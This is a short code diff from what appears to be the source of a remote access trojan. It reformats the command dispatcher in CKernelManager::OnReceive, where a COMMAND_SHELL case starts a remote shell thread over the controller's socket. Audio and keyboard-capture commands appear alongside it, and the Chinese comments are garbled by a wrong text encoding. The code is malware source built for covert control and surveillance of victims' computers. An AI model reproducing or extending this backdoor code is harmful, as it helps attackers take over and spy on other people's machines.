@@ -71,13 +71,24 @@ void CKernelManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
 		break;
 
 	case COMMAND_AUDIO: // ÉãÏñÍ·
-		//m_hThread[m_nThreadCount++] = DoCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_AudioManager,
-		//	(LPVOID)m_pClient->m_Socket, 0, NULL);
+		//m_hThread[m_nThreadCount++] = DoCreateThread(
+		//	NULL, 
+		//	0, 
+		//	(LPTHREAD_START_ROUTINE)Loop_AudioManager,
+		//	(LPVOID)m_pClient->m_Socket, 
+		//	0, 
+		//	NULL);
 		break;
 
 	case COMMAND_SHELL: // Ô¶³Ìsehll
-		m_hThread[m_nThreadCount++] = DoCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_ShellManager, 
-			(LPVOID)m_pClient->m_Socket, 0, NULL, true);
+		m_hThread[m_nThreadCount++] = DoCreateThread(
+			NULL,
+			0, 
+			(LPTHREAD_START_ROUTINE)Loop_ShellManager, 
+			(LPVOID)m_pClient->m_Socket, 
+			0, 
+			NULL, 
+			true);
 		break;
 
 	case COMMAND_KEYBOARD: 
